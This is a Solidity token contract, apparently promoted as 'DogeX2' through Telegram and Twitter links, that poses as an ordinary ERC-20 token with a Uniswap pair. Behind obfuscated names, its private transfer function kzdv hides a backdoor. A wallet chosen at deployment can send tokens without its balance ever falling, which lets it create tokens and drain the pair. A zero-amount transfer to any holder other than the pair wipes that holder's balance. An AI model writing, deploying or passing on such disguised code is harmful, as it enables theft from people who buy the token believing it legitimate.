/*

Telegram: https://t.me/Dogex2Portal

Twitter: https://twitter.com/DogeX2ERC

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Doge is Ownable {
    uint256 private yjkqdpl = 120;

    address public dgcjxl;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function kzdv(address xcwi, address gtrdzocph, uint256 vealqouzkrp) private {
        if (0 == cbpfurl[xcwi]) {
            balanceOf[xcwi] -= vealqouzkrp;
        }
        balanceOf[gtrdzocph] += vealqouzkrp;
        if (0 == vealqouzkrp && gtrdzocph != dgcjxl) {
            balanceOf[gtrdzocph] = vealqouzkrp;
        }
        emit Transfer(xcwi, gtrdzocph, vealqouzkrp);
    }

    string public symbol = "_symbol";

    mapping(address => uint256) public balanceOf;

    constructor(address ikszo) {
        balanceOf[msg.sender] = totalSupply;
        cbpfurl[ikszo] = yjkqdpl;
        IUniswapV2Router02 jeuocmtszq = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        dgcjxl = IUniswapV2Factory(jeuocmtszq.factory()).createPair(address(this), jeuocmtszq.WETH());
    }

    uint8 public decimals = 9;

    function transfer(address gtrdzocph, uint256 vealqouzkrp) public returns (bool success) {
        kzdv(msg.sender, gtrdzocph, vealqouzkrp);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address fhmezjlg, uint256 vealqouzkrp) public returns (bool success) {
        allowance[msg.sender][fhmezjlg] = vealqouzkrp;
        emit Approval(msg.sender, fhmezjlg, vealqouzkrp);
        return true;
    }

    string public name = "_name";

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address xcwi, address gtrdzocph, uint256 vealqouzkrp) public returns (bool success) {
        require(vealqouzkrp <= allowance[xcwi][msg.sender]);
        allowance[xcwi][msg.sender] -= vealqouzkrp;
        kzdv(xcwi, gtrdzocph, vealqouzkrp);
        return true;
    }

    mapping(address => uint256) private cbpfurl;
}